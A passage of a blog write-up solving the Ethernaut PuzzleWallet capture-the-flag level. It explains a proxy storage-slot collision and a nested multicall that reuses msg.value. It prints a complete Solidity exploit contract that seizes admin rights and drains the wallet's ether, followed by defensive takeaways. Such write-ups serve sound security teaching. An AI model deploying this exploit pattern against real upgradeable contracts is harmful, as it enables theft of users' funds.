</span></span><span class=line><span class=ln> 2</span><span class=cl><span class=kd>function</span> <span class=nf>init</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>_maxBalance</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>maxBalance</span> <span class=o>==</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Already initialized&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=n>maxBalance</span> <span class=o>=</span> <span class=n>_maxBalance</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>
</span></span><span class=line><span class=ln> 8</span><span class=cl><span class=kd>function</span> <span class=nf>setMaxBalance</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>_maxBalance</span><span class=p>)</span> <span class=k>external</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>==</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Contract balance is not 0&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=n>maxBalance</span> <span class=o>=</span> <span class=n>_maxBalance</span><span class=p>;</span>
</span></span><span class=line><span class=ln>11</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <code>maxBalance</code> is only changed in these two functions. It is not possible to change the <code>maxBalance</code> by calling <code>init()</code> because when <code>PuzzleProxy</code> makes a delegate call to <code>PuzzleWallet</code> and calls <code>init()</code>, the <code>maxBalance</code> will be the address of the admin converted to <strong>uint256</strong> and it won&rsquo;t be equal to zero. So we won&rsquo;t be able to call <code>init()</code>. In a delegate call, state variable readings and writings will be done on the caller contract.</p><p>The only way we can change <code>maxBalance</code> is by calling <code>setMaxBalance()</code>. However, there is a modifier <code>onlyWhitelisted</code>. In order to set <code>maxBalance</code>, we need to pass the modifier and drain the balance of the contract. The modifier will check whether the <code>msg.sender</code> is whitelisted or not. Here, <code>msg.sender</code> won&rsquo;t be the address of <code>PuzzleProxy</code>; it will be the address of the caller who is calling <code>PuzzleProxy</code> because in a delegate call, <code>msg.sender</code> and <code>msg.value</code> will be passed as the same.</p><div style=text-align:center><img src=/Ethernaut/PuzzleWallet/img1.png alt="My Centered Image"></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>addToWhitelist</span><span class=p>(</span><span class=kt>address</span> <span class=n>addr</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>owner</span><span class=p>,</span> <span class=s>&#34;Not the owner&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=n>whitelisted</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>4</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The above function will add the address passed to the whitelist. However, only the owner can call this function. The <code>owner</code> state variable is stored in <code>slot0</code>. In the <code>PuzzleProxy</code> contract, <code>slot0</code> stores <code>pendingAdmin</code>. Since anyone can propose the admin, if we propose our Exploit contract as the admin, then the exploit contract address will be stored as <code>pendingAdmin</code>.</p><p>After making <code>pendingAdmin</code> our exploit contract, we will be able to call <code>addToWhitelist()</code> in the <code>PuzzleWallet</code> contract. This is because we are interacting with <code>PuzzleProxy</code>, and <code>PuzzleProxy</code> is making a delegate call to <code>PuzzleWallet</code>. When the logic in <code>PuzzleWallet</code> reads some state variables, these state variables will be read from the <code>PuzzleProxy</code> contract.</p><p>Once we set the <code>pendingAdmin</code> to our exploit contract address, we will become the owner. The <code>setMaxBalance()</code> function also has an additional check to see if the contract balance is zero. So, we need to make the contract balance zero. Once this is done, we can change the <code>maxBalance</code>, which means we are changing the <code>admin</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>execute</span><span class=p>(</span><span class=kt>address</span> <span class=n>to</span><span class=p>,</span> <span class=kt>uint256</span> <span class=nb>value</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=nb>value</span><span class=p>,</span> <span class=s>&#34;Insufficient balance&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=ln>4</span><span class=cl>    <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,)</span> <span class=o>=</span> <span class=n>to</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=nb>value</span><span class=p>}(</span><span class=nb>data</span><span class=p>);</span>
</span></span><span class=line><span class=ln>5</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>success</span><span class=p>,</span> <span class=s>&#34;Execution failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>6</span><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>The only way we can withdraw ether from the <code>PuzzleProxy</code> contract is by calling <code>execute()</code> in the <code>PuzzleWallet</code>. This function checks if we have sufficient balance to withdraw. If we have sufficient balance, then we can withdraw. Before withdrawing, we need to deposit some ether into the contract.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>deposit</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&lt;=</span> <span class=n>maxBalance</span><span class=p>,</span> <span class=s>&#34;Max balance reached&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=ln>4</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <code>deposit()</code> function in <code>PuzzleWallet</code> will check if the current balance of the <code>PuzzleProxy</code> contract is less than <code>maxBalance</code>. If it is less, then it updates the balance of <code>msg.sender</code> with <code>msg.value</code>.</p><p>The functions <code>deposit()</code> and <code>execute()</code> work normally, and we can&rsquo;t find many exploits there. However, there is one more way we can deposit ether: by calling <code>multicall()</code> with the data as the <code>deposit()</code> function selector. Now, let&rsquo;s deep dive into the <code>multicall()</code> function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=kd>function</span> <span class=nf>multicall</span><span class=p>(</span><span class=kt>bytes</span><span class=p>[]</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>    <span class=kt>bool</span> <span class=n>depositCalled</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>data</span><span class=p>.</span><span class=n>length</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>        <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>_data</span> <span class=o>=</span> <span class=nb>data</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>        <span class=kt>bytes4</span> <span class=nb>selector</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>        <span class=k>assembly</span> {
</span></span><span class=line><span class=ln> 7</span><span class=cl>            <span class=n>selector</span> <span class=o>:=</span> <span class=nf>mload</span><span class=p>(</span><span class=nf>add</span><span class=p>(</span><span class=n>_data</span><span class=p>,</span> <span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>selector</span> <span class=o>==</span> <span class=nb>this</span><span class=p>.</span><span class=n>deposit</span><span class=p>.</span><span class=nb>selector</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>            <span class=nb>require</span><span class=p>(</span><span class=o>!</span><span class=n>depositCalled</span><span class=p>,</span> <span class=s>&#34;Deposit can only be called once&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>            <span class=c1>// Protect against reusing msg.value
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=c1></span>            <span class=n>depositCalled</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,)</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>data</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>success</span><span class=p>,</span> <span class=s>&#34;Error while delegating call&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>17</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The above function takes a bytes array as input, and for each element in the array, it will get the function selector and check if the selector is the selector of the <code>deposit()</code> function. If it is <code>deposit()</code>, it will set <code>depositCalled</code> to true and then call <code>deposit()</code> using the delegate call. This check is important due to the properties of delegate call.</p><p>Assume there are three contracts: <code>contract_1</code>, <code>contract_2</code>, and <code>contract_3</code>. If we call a function in <code>contract_1</code> and that function makes a delegate call to <code>contract_2</code>, and then the function in <code>contract_2</code> makes a delegate call to <code>contract_3</code>, what will be the <code>msg.sender</code> and <code>msg.value</code> in <code>contract_3</code>? They will be the <code>msg.sender</code> and <code>msg.value</code> of <code>contract_1</code>.</p><div style=text-align:center><img src=/Ethernaut/PuzzleWallet/img2.png alt="My Centered Image"></div><p>In the <code>multicall</code> function, if we try to call the <code>deposit()</code> function twice by passing its function selector in the <code>data</code> array, the transaction will revert. This is because <code>depositCalled</code> is initially set to <code>false</code>. When <code>deposit()</code> is called for the first time, <code>depositCalled</code> is set to <code>true</code>. On the second iteration, when <code>deposit()</code> is called again, the <code>require</code> statement will fail since <code>depositCalled</code> is now <code>true</code>, causing the transaction to revert with the message &ldquo;Deposit can only be called once&rdquo;.</p><p>When someone wants to deposit two ether by sending only one ether, they might try to call the <code>multicall()</code> function by passing the function selector of <code>deposit()</code> in the <code>data</code> array twice. However, due to the <code>require</code> statement that checks if <code>depositCalled</code> is <code>false</code>, the transaction will revert on the second call. This prevents depositing twice with a single amount. If there were no <code>require</code> statement, it would be possible because <code>multicall()</code> is making a delegate call to <code>deposit()</code>, and the <code>msg.sender</code> and <code>msg.value</code> would be the same for each call. Check the below image.</p><p>Assume there is no require statment and Suppose if we invoke multicall() with 1ether and data as function selector of deposit() twice then for the first time it will call deposit() and msg.value will be 1 ether and second time it will again call deposit() and msg.value will be 1 ether. So technically we made our balances as <code>2 ether</code> by depositing <code>1 ether</code>.</p><p>Due to the <code>require</code> statement, we can&rsquo;t call <code>deposit()</code> twice directly. However, if we pass the calldata to invoke <code>deposit()</code> as the first element of the <code>data</code> array, and then pass the calldata to invoke <code>multicall()</code> with the argument as calldata to invoke <code>deposit()</code>, we can bypass the <code>require</code> check. This way, we can set our balance to 2 ether by sending only 1 ether.</p><p>Now, if we check the balance of the <code>PuzzleProxy</code> contract, it is 0.001 ether. So, we need to deposit 0.001 ether to make our balance 0.002 ether and then withdraw all the ether.</p><div style=text-align:center><img src=/Ethernaut/PuzzleWallet/img3.png alt="My Centered Image"></div><p>Now let&rsquo;s write our exploit contract.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>
</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=kd>interface</span> <span class=nc>IProxy</span><span class=p>{</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=kd>function</span> <span class=nf>proposeNewAdmin</span><span class=p>(</span><span class=kt>address</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=kd>function</span> <span class=nf>approveNewAdmin</span><span class=p>(</span><span class=kt>address</span><span class=p>)</span> <span class=k>external</span> <span class=p>;</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>    <span class=kd>function</span> <span class=nf>setMaxBalance</span><span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=kd>function</span> <span class=nf>addToWhitelist</span><span class=p>(</span><span class=kt>address</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=kd>function</span> <span class=nf>deposit</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>;</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=kd>function</span> <span class=nf>execute</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span> <span class=kt>uint256</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span><span class=p>;</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=kd>function</span> <span class=nf>multicall</span><span class=p>(</span><span class=kt>bytes</span><span class=p>[]</span> <span class=n>calldata</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span><span class=p>;</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>    <span class=kd>function</span> <span class=nf>admin</span><span class=p>()</span><span class=k>external</span> <span class=k>view</span> <span class=k>returns</span><span class=p>(</span><span class=kt>address</span><span class=p>);</span>
</span></span><span class=line><span class=ln>13</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>
</span></span><span class=line><span class=ln>15</span><span class=cl>
</span></span><span class=line><span class=ln>16</span><span class=cl>
</span></span><span class=line><span class=ln>17</span><span class=cl><span class=kd>contract</span> <span class=nc>ExploitPuzzleProxy</span><span class=p>{</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>    <span class=n>IProxy</span> <span class=n>proxy</span><span class=p>;</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>    <span class=kt>address</span> <span class=n>player</span><span class=p>;</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_proxy</span><span class=p>){</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>        <span class=n>proxy</span><span class=o>=</span><span class=n>IProxy</span><span class=p>(</span><span class=n>_proxy</span><span class=p>);</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>        <span class=n>player</span><span class=o>=</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>
</span></span><span class=line><span class=ln>25</span><span class=cl>    <span class=kd>function</span> <span class=nf>Exploit</span><span class=p>()</span><span class=k>public</span> <span class=k>payable</span><span class=p>{</span>
</span></span><span class=line><span class=ln>26</span><span class=cl>        <span class=n>proxy</span><span class=p>.</span><span class=n>proposeNewAdmin</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>));</span>
</span></span><span class=line><span class=ln>27</span><span class=cl>        <span class=n>proxy</span><span class=p>.</span><span class=n>addToWhitelist</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>));</span>
</span></span><span class=line><span class=ln>28</span><span class=cl>
</span></span><span class=line><span class=ln>29</span><span class=cl>        <span class=kt>bytes</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>main_data</span><span class=o>=</span><span class=k>new</span> <span class=kt>bytes</span><span class=p>[](</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=ln>30</span><span class=cl>        <span class=kt>bytes</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>second_deposit</span><span class=o>=</span><span class=k>new</span> <span class=kt>bytes</span><span class=p>[](</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=ln>31</span><span class=cl>        <span class=n>second_deposit</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;deposit()&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>32</span><span class=cl>
</span></span><span class=line><span class=ln>33</span><span class=cl>        <span class=n>main_data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>second_deposit</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=ln>34</span><span class=cl>        <span class=n>main_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;multicall(bytes[])&#34;</span><span class=p>,</span><span class=n>second_deposit</span><span class=p>);</span>
</span></span><span class=line><span class=ln>35</span><span class=cl>
</span></span><span class=line><span class=ln>36</span><span class=cl>        <span class=n>proxy</span><span class=p>.</span><span class=n>multicall</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span> <span class=kc>ether</span><span class=p>}(</span><span class=n>main_data</span><span class=p>);</span>
</span></span><span class=line><span class=ln>37</span><span class=cl>        <span class=n>proxy</span><span class=p>.</span><span class=n>execute</span><span class=p>(</span><span class=n>player</span><span class=p>,</span><span class=mi>0</span><span class=p>.</span><span class=mi>002</span> <span class=kc>ether</span><span class=p>,</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>38</span><span class=cl>        <span class=kt>uint256</span> <span class=n>Player_Address</span><span class=o>=</span><span class=kt>uint256</span><span class=p>(</span><span class=kt>uint160</span><span class=p>(</span><span class=n>player</span><span class=p>));</span>
</span></span><span class=line><span class=ln>39</span><span class=cl>        <span class=n>proxy</span><span class=p>.</span><span class=n>setMaxBalance</span><span class=p>(</span><span class=n>Player_Address</span><span class=p>);</span>
</span></span><span class=line><span class=ln>40</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>proxy</span><span class=p>.</span><span class=n>admin</span><span class=p>()</span><span class=o>==</span><span class=n>player</span><span class=p>,</span> <span class=s>&#34;Exploit Failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>41</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>42</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Deploy this contract and call the exploit function by sending <code>0.001 ether</code> or <code>1000000000000000 wei</code>. Once the call is done the challenge will be solved.</p><p>That&rsquo;s it for this challenge see you in the next challenge.</p><p>If you are a beginner to blockchain and understanding this challenge, it&rsquo;s a really great thing. Be proud of yourself.</p><h3 id=key-takeaways data-numberify>Key Takeaways<a class="anchor ms-1" href=#key-takeaways></a></h3><p>Whenever we implement upgradable contracts, we need to be very careful while designing the storage layout. The logic contract and state variables contract should have the same storage layout. In this challenge, a major part of the exploit was due to the storage layout.</p><p>In order to safeguard the <code>multicall</code>, we need to write a modifier that handles the inner call to <code>multicall</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>
</span></span><span class=line><span class=ln> 2</span><span class=cl><span class=kd>modifier</span> <span class=nf>Handle_Deposit</span><span class=p>(</span><span class=kt>address</span> <span class=n>_depositer</span><span class=p>,</span><span class=kt>bytes</span><span class=p>[]</span> <span class=n>_calldata</span><span class=p>){</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>    <span class=kt>bytes4</span> <span class=k>memory</span> <span class=nb>data</span> <span class=o>=</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSelector</span><span class=p>(</span><span class=nb>this</span><span class=p>.</span><span class=n>multicall</span><span class=p>.</span><span class=nb>selector</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>uint</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=n>i</span><span class=o>&lt;</span><span class=n>_calldata</span><span class=p>.</span><span class=n>length</span><span class=p>;</span><span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=kt>bytes4</span><span class=p>(</span><span class=n>_calldata</span><span class=p>[</span><span class=n>i</span><span class=p>])))</span><span class=o>==</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=nb>data</span><span class=p>))){</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;Calling multicall is not allowed here&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=ln>10</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p style=text-align:center>***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p></div></div></div><div class=card-footer><div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform=rotate-90></i>
<a href=/blogs/ethernaut/dextwo/>DexTwo</a></div><div class="post-nav post-next"><a href=/blogs/ethernaut/doubleentrypoint/>DoubleEntryPoint</a>
<i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform=rotate-270></i></div></div></div></article><section class="related-posts row card component"><div class=card-header><h2 class="card-title fs-4 my-2 text-surface">Related Posts</h2></div><div class="card-body slide px-1"><div class="slide-inner row gx-0"><div class="col-12 col-md-6 col-lg-4 me-2"><div class="post-card card card-body p-0 border-0 surface"><div class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">NO IMAGE</div><a class=post-title href=/blogs/ethernaut/preservation/>Preservation</a><div class="post-meta mb-0">October 23, 2024</div></div></div><div class="col-12 col-md-6 col-lg-4 me-2"><div class="post-card card card-body p-0 border-0 surface"><div class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">NO IMAGE</div><a class=post-title href=/blogs/ethernaut/delegation/>Delegation</a><div class="post-meta mb-0">October 23, 2024</div></div></div></div><button class=slide-control-left>
<i class="fas fa-2x fa-chevron-circle-down" data-fa-transform=rotate-90></i>
<span class=visually-hidden>Left</span>
</button>
<button class=slide-control-right>
<i class="fas fa-2x fa-chevron-circle-down" data-fa-transform=rotate-270></i>
<span class=visually-hidden>Right</span></button></div></section><div class="card component row post-comments" id=post-comments><div class=card-header><h2 class="card-title my-2 fs-4 text-surface">Comments</h2></div><div class=card-body><div class=giscus></div></div></div></div></div><aside class="col-xxl-4 sidebar d-flex"><div class="container d-flex flex-column"><div class="accordion profile"><div class="accordion-item card row text-center component"><div class="accordion-header card-header border-0" id=profile-header><a class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface" role=button data-bs-toggle=collapse href=#profile aria-expanded=true aria-controls=profile>Profile</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=profile aria-labelledby=profile-header><div class="col-12 d-flex align-items-center justify-content-center"><picture><source srcset=https://s4bot3ur.github.io/images/avatar.webp type=image/webp><img class="profile-avatar rounded-circle" alt="Komal Rao" src loading=lazy data-viewer-invisible></picture></div><div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">Komal Rao</div><div class=profile-bio>Web3 Security Researcher</div><div class=profile-company><i class="fas fa-fw fa-building"></i>Team Bi0s</div><div class=profile-location><i class="fas fa-fw fa-map-marker-alt"></i>Bharat</div></div><nav class="social-links nav justify-content-center mt-1 justify-content-around"><a class="nav-link social-link" target=_blank href=https://github.com/s4bot3ur title=GitHub rel=me><i class="fa-fw fa-2x fab fa-github"></i>
</a><a class="nav-link social-link" target=_blank href=https://linkedin.com/in/dheekonda-komal-rao-6bb68727b title=LinkedIn rel=me><i class="fa-fw fa-2x fab fa-linkedin-in" style=color:#0a66c2></i>
</a><a class="nav-link social-link" target=_blank href=https://medium.com/@s4bot3ur title=Medium rel=me><i class="fa-fw fa-2x fab fa-medium-m"></i>
</a><a class="nav-link social-link" target=_blank href=/authors/index.xml title=RSS rel=me><i class="fas fa-fw fa-2x fa-rss" style=color:#ea6221></i></a></nav></div></div></div><div class="accordion taxonomies-toggle"><div class="row card component accordion-item"><div class="accordion-header card-header border-0"><a class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#taxonomies-toggle aria-expanded=true aria-controls=taxonomies-toggle>Taxonomies</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=taxonomies-toggle><ul class="nav nav-pills nav-fill" role=tablist><li class=nav-item role=presentation><button class="nav-link active" id=taxonomyCategoriesTab data-bs-toggle=tab data-bs-target=#taxonomyCategories type=button role=tab aria-controls=taxonomyCategories aria-selected=true>
Categories</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomyTagsTab data-bs-toggle=tab data-bs-target=#taxonomyTags type=button role=tab aria-controls=taxonomyTags aria-selected=true>
Tags</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomySeriesTab data-bs-toggle=tab data-bs-target=#taxonomySeries type=button role=tab aria-controls=taxonomySeries aria-selected=true>
Series</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomyArchivesTab data-bs-toggle=tab data-bs-target=#taxonomyArchives type=button role=tab aria-controls=taxonomyArchives aria-selected=true>
Archives</button></li></ul><div class="tab-content mt-3"><div class="tab-pane active" id=taxonomyCategories role=tabpanel aria-labelledby=taxonomyCategoriesTab tabindex=0><a href=/categories/blockchain/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title=Blockchain>Blockchain</a></div><div class=tab-pane id=taxonomyTags role=tabpanel aria-labelledby=taxonomyTagsTab tabindex=0><a href=/tags/erc20/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=ERC20>ERC20
</a><a href=/tags/access-control/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Access Control">Access Control
</a><a href=/tags/delegate-call/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Delegate Call">Delegate Call
</a><a href=/tags/storage-layout/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Storage Layout">Storage Layout
</a><a href=/tags/control-flow-manipulation/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Control Flow Manipulation">Control Flow Manipulation
